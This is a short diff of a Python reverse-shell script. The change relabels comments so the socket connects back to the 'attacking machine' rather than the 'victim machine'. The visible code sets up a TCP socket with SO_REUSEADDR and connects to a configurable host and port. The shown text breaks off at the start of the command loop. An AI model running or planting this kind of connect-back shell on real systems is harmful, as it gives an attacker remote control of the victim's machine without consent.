@@ -3,9 +3,9 @@ import socket
 import sys
 import subprocess
 
-# Replace the HOST and PORT with IP/PORT of victim machine
-HOST = '0.0.0.0' # IP of victim machine
-PORT = 50008   # Port of victim machine
+# Replace the HOST and PORT with IP/PORT of attacking machine
+HOST = '0.0.0.0' # IP of attacking machine
+PORT = 50008   # Port of attacking machine
 s = None
 
 # Ask the kernel for a newly-initialised (unbound) socket
@@ -14,7 +14,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # Force the socket to open after 
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-# Creates a connection socket to the HOST/PORT of victim machine
+# Creates a connection socket to the HOST/PORT of attacking machine
 s.connect((HOST, PORT))
 
 while True:
